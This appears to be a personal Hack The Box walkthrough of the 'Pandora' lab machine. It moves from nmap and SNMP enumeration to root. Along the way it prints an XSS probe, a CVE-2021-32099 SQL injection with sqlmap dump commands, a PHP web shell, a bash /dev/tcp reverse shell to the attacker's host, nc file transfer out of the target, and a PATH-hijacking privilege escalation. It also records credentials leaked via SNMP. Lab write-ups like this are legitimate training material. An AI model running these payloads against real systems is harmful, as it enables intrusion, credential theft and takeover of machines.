2023
### NMAP

```
sudo nmap -sC -sV -oA nmap-pandora 
10.10.11.136
```

![[HackTheBox/Linux/attachments/Pasted image 20250510221732.png]]
- 22, 80

### Enumerate web page 

![[HackTheBox/Linux/attachments/Pasted image 20250510221820.png]]
- add `panda.htb` to `/etc/hosts`

![[HackTheBox/Linux/attachments/Pasted image 20250510221922.png]]
- two emails

#### Fuzzing contact form

Inputting XSS 

```
<img src="http://10.10.14.8/test"></img><a href="http://10.10.14.8/">click me </a>
```
![[HackTheBox/Linux/attachments/Pasted image 20250510222114.png]]
Before sending the message, set up a nc listener on port 80 

```
sudo nc -lvnp 80
```

Send the message and notice it all in the GET request 
![[HackTheBox/Linux/attachments/Pasted image 20250510222426.png]]

Did not get a connection request from the web server
#### gobuster 

```
gobuster dir -u http://10.10.11.136 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
```

### NMAP - all ports 

```
sudo nmap -p- 10.10.11.136 --min-rate=10000 -v -oN nmap-pandora-allports
```

![[HackTheBox/Linux/attachments/Pasted image 20250510222838.png]]
- nothing

### NMAP - UDP ports 

```
sudo nmap -sU 10.10.11.136 -v -oN nmap-pandora-udp
```

22 minutes later....

Discover port 161/udp open - SNMP

![[HackTheBox/Linux/attachments/Pasted image 20250510223212.png]]

### SNMP Enumeration (Port 161)

#### Pre-reqs 
Install SNMP Mibs downloader 

```
sudo apt install snmp-mibs-downloader
```

After this is installed, comment out line 4 # mibs :$ `/etc/snmp/snmp.conf`

![[HackTheBox/Linux/attachments/Pasted image 20250510223719.png]]


```
snmpwalk -c public -v2c 10.10.11.136
```

Lots of info 
![[HackTheBox/Linux/attachments/Pasted image 20250510223351.png]]

Because it's so much info, we'll use #snmpbulkwalk

```
snmpbulkwalk -Cr1000 -c public -v2c 10.10.11.136 . > snmpwalk.1
```

Find the unique fields in the snmpwalk output 

```
grep -oP '::.*?\.' snmpwalk.1 | sort | uniq -c 
```

We're interested in SWRun 
![[HackTheBox/Linux/attachments/Pasted image 20250511010402.png]]

```
grep hrSWRun snmpwalk.1 | less -5
```
![[HackTheBox/Linux/attachments/Pasted image 20250511010454.png]]
- found credentials! 
- `daniel:HotelBabylon23`

#### Another way to enum snmp
Using snmpenum 
```
snmpenum 10.10.11.136 public linux.txt
```
### SSH in for initial access

```
ssh daniel@10.10.11.136
```

❗got initial access❗

### Enumerate webserver files and configs 

```
ls /var/www/html
```

![[HackTheBox/Linux/attachments/Pasted image 20250511011233.png]]
- nothing new in index.html

Checking out 
```
ls /var/www/pandora
```

![[HackTheBox/Linux/attachments/Pasted image 20250511011357.png]]

Search for `config.php` within the `/var/www/pandora/pandora_console`

```
find . | grep config.php
```

![[HackTheBox/Linux/attachments/Pasted image 20250511013404.png]]

Try to view `config.php` but get permission denied

```
less ./include/config.php
```

Matt owns this file 
![[HackTheBox/Linux/attachments/Pasted image 20250511013529.png]]

### Check Apache's config 

```
ls /etc/apache2/sites-enabled
```

We find `pandora.conf`

![[HackTheBox/Linux/attachments/Pasted image 20250511013757.png]]
- find new hostname `pandora.panda.htb` in the `pandora.conf` file.
- add `pandora.panda.htb` to `/etc/hosts`

Navigating to the site, but there's nothing new there. 

Run ~C in daniel's terminal
```
~C
```

![[HackTheBox/Linux/attachments/Pasted image 20250511014018.png]]

Set up port forwarding to be able to access `pandora.panda.htb`

```
ssh> -L 8000:127.0.0.1:80
```

![[HackTheBox/Linux/attachments/Pasted image 20250511014243.png]]

Navigate to `localhost:8000/pandora_console` in the web browser and discover another website!!

![[HackTheBox/Linux/attachments/Pasted image 20250511195857.png]]
- login page as well
- try to login with `admin:admin` but doesn't work

See the website version number here as well 
![[HackTheBox/Linux/attachments/Pasted image 20250511200059.png]]

### Searchsploit

Search for an exploit 

```
searchsploit Pandora | grep 7
```

![[HackTheBox/Linux/attachments/Pasted image 20250511200301.png]]

View this net_tools exploit with 

```
searchsploit -x php/webapps/48280.py
```

![[HackTheBox/Linux/attachments/Pasted image 20250511200406.png]]
- this is for authenticated users onlyyy

### Google exploits 

Keep looking by googling "pandora fms exploit unauthenticated 7.0"

Find out there is CVE-2021-32099 - Unauthenticated SQL Injection vulnerability 

From a CVE article, we know there's an sql injection in the session_id parameter. 

In the URL we would append

```
localhost:8000/pandora_console/include/chart_generator.php?session_id=1' or 1=1-- d 
```

Confirming this sql injection..

Send the request over to Burp and save the request to a file called pandora.req for sqlmap

```
?session_id=1
```
![[HackTheBox/Linux/attachments/Pasted image 20250511211100.png]]

### SQLMap

Fuzz the session_id parameter with sqlmap 

```
sqlmap -r pandora.req --batch
```

Result 
![[HackTheBox/Linux/attachments/Pasted image 20250511211425.png]]
- found a union SQL injection

Dump the names of the databases
```
sqlmap -r pandora.req --batch --dbs
```

![[HackTheBox/Linux/attachments/Pasted image 20250511211735.png]]

Dump the tables from the pandora database
```
sqlmap -r pandora.req --batch -D pandora --tables
```
![[HackTheBox/Linux/attachments/Pasted image 20250511212127.png]]

Dump the tsessions table
```
sqlmap -r pandora.req --batch -D pandora -T tsesion --dump
```

![[HackTheBox/Linux/attachments/Pasted image 20250511212609.png]]
- don't actually care about this 
-----------

Dump the entire database and timestamp it 
This took 23 mins to finish.
```
time sqlmap -r pandora.req --dump -D pandora --batch --threads 10
```

-----------

Dump the tusuario (usernames) table 

```
sqlmap -r pandora.req --batch -D pandora -T tusuario --dump
```

Got some usernames and hashed passwords

![[HackTheBox/Linux/attachments/Pasted image 20250511213101.png]]

Checking out what tables we have again
![[HackTheBox/Linux/attachments/Pasted image 20250511213140.png]]

Dump the tsessions_php table 

```
sqlmap -r pandora.req --batch -D pandora -T tsessions_php --dump
```

Lots of sessions 

![[HackTheBox/Linux/attachments/Pasted image 20250511213630.png]]

Copy one of these strings and paste it into the session_id parameter in the URL

![[HackTheBox/Linux/attachments/Pasted image 20250511213727.png]]
- this didn't work or log us in.

Try pasting the session id into cookies in dev tools
![[HackTheBox/Linux/attachments/Pasted image 20250511214149.png]]
- refresh the page after pasting, but nothing happens :/

Maybe the session is dead? 

Trying a different session_id by pasting it into the URL an refreshing the page and we get logged in as matt

![[HackTheBox/Linux/attachments/Pasted image 20250511220045.png]]
- clicking around and it doesn't seem like matt is an admin
- try another session id?

Let's try using the union injection to login as admin by placing a php serialized object that it expects

### Login using UNION injection

Construct payload in the URL 
![[HackTheBox/Linux/attachments/Pasted image 20250511220354.png]]

Response 
![[HackTheBox/Linux/attachments/Pasted image 20250511220423.png]]
- get the tsessions_php table name

Construct payload with some info from the sqlmap table dump 
![[HackTheBox/Linux/attachments/Pasted image 20250511220656.png]]

Change "daniel" to "admin" and change s to 5 (characters)

![[HackTheBox/Linux/attachments/Pasted image 20250511220844.png]]

This grants us access to the app as an admin! woop!
![[HackTheBox/Linux/attachments/Pasted image 20250511220920.png]]

Let's try to upload a file
![[HackTheBox/Linux/attachments/Pasted image 20250511221017.png]]

Create a quick php script to prove we can get code execution
```
<?php
system($_REQUEST['cmd']);
?>
```

Upload this to the web server 

![[HackTheBox/Linux/attachments/Pasted image 20250511221228.png]]
- success!

Click on shell.php within the images directory and add the 'whoami' argument to our cmd parameter 
![[HackTheBox/Linux/attachments/Pasted image 20250511221332.png]]
- we got code execution

### Reverse shell time 

Intercept this web request with Burp and convert to a POST request and add bash shell payload 

bash shell payload 
```
bash -c 'bash -i >& /dev/tcp/10.10.14.8/9001 0>&1' 
```

And url-encode this payload
![[HackTheBox/Linux/attachments/Pasted image 20250511221644.png]]

Set up nc listener and catch the reverse shell 

![[HackTheBox/Linux/attachments/Pasted image 20250511221733.png]]

❗got initial access as matt❗

Spawn interactive shell. 

### Enumerate for Priv Esc 

Checking out matt's files 
![[HackTheBox/Linux/attachments/Pasted image 20250511221902.png]]

#### LinPEAS

Transfer LinPEAS and execute 

Reviewing output and see an unknown SUID binary for pandora_backup 

![[HackTheBox/Linux/attachments/Pasted image 20250511222518.png]]

### Interesting SUID binary found

/usr/bin/pandora_backup
Enumerating this binary...

#### execute it 
```
/usr/bin/pandora_backup
```

![[HackTheBox/Linux/attachments/Pasted image 20250511223305.png]]
- tar is attempting to archive stuff but we don't have permissions to execute tar
#### file 
```
file /usr/bin/pandora_backup
```

![[HackTheBox/Linux/attachments/Pasted image 20250511222717.png]]

#### strings

```
strings /usr/bin/pandora_backup
```

![[HackTheBox/Linux/attachments/Pasted image 20250511222838.png]]
- no strings on this box.

Transfer this binary to kali 
```
nc 10.10.14.8 9002 < /usr/bin/pandora_backup
```

Catch the file with nc listener
```
nc -lvnp 9002 > pandora_backup
```

![[HackTheBox/Linux/attachments/Pasted image 20250511223042.png]]

We have the file.

Re-execute strings against the file 

```
strings /usr/bin/pandora_backup
```

Look for tar 

![[HackTheBox/Linux/attachments/Pasted image 20250511223411.png]]
- running tar, but is not using absolute path.
- vulnerable to path injection 

#### Ghidra
Open this file in ghidra to confirm path injection vuln 

```
/opt/ghidra/ghidraRun
```

![[HackTheBox/Linux/attachments/Pasted image 20250511223717.png]]
- notice that the tar binary path is not absolute 
- the full path would be:

![[HackTheBox/Linux/attachments/Pasted image 20250511223814.png]]

#### Path Hijacking 

Hijacking the tar utility path

```
echo /bin/bash > tar
```

![[HackTheBox/Linux/attachments/Pasted image 20250511224044.png]]

```
export PATH=/home/matt:$PATH
```

```
echo $PATH
```

![[HackTheBox/Linux/attachments/Pasted image 20250511224149.png]]

```
chmod +x tar
```

```
which tar
```

![[HackTheBox/Linux/attachments/Pasted image 20250511224233.png]]
- it workieee

Then executing should make us root
```
/usr/bin/pandora_backup
```

but it didn't...because we can't setresuid

![[HackTheBox/Linux/attachments/Pasted image 20250511224414.png]]

### SSH into box as a workaround the SETRESUID issue..

Generate ssh key for matt on kali
```
ssh-keygen -f matt
```

```
chmod 600 matt
```

Set up simple python server to transfer the ssh public key to matt's .ssh directory into `authorized_keys`

Now ssh in as matt 
```
ssh -i matt matt@10.10.11.136
```

Re-running through the export PATH steps to hijack the tar binary path and re-execute the pandora_backup binary and get root 

![[HackTheBox/Linux/attachments/Pasted image 20250511225125.png]]
⭐got root⭐

